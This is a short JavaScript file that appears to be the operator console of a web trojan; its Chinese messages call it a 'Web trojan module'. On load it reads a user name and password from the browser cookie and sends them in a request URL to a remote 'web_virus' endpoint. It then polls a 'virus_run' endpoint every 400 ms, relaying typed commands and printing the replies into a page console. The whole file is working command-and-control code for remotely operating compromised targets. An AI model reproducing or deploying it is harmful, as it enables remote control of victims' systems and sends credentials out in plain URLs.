var command = 'none';

document.onkeydown = function(ev) 
{
    var event = ev || window.event;
    if (event.keyCode ==13) {
        var c = document.getElementById("in_command");
        var console = document.getElementById('console');

        if (command == 'clear') {
            console.innerHTML = '';
        }
        command = c.value;
        c.value = ''
    }
}

window.onload = function() {
    try {
        var console_dom = document.getElementById('console');
        var xhr = new XMLHttpRequest();
        var json = JSON.parse(document.cookie);
        xhr.open("GET" , remote+"/api/web_virus/"+json.user+"/"+json.pwd , true);
        xhr.send();
        xhr.onload = function() {
            var token = xhr.responseText;
            showAlert("<h2 style='color:red'>收到信息:</h2>"+'请访问URL:<br/>' + remote + '/'+token , null)

            var run = setInterval(function() 
            {
                var get_message = new XMLHttpRequest();
                get_message.open(
                    'GET',remote+"/virus_run/"+token+"/"+command , true
                    );
                get_message.send();
                get_message.onload = function() 
                {
                    if (get_message.readyState === 4) 
                    {
                        var r = get_message.responseText;
                        if (r.replace('\n','') != 'none')
                        {
                            //showAlert(r , 1000)
                            console.log(r);
                            console_dom.innerHTML = ''
                            console_dom.innerHTML += '<br /><br />'+r;  
                            command = 'none'
                        }
                    }
                }
            } , 400); //使用短轮询，不是 websocket 用不起，而是短轮询更有性价比.
        }
    }catch(e) {
        showAlert("加载Web木马模块错误: "+e)
    }
}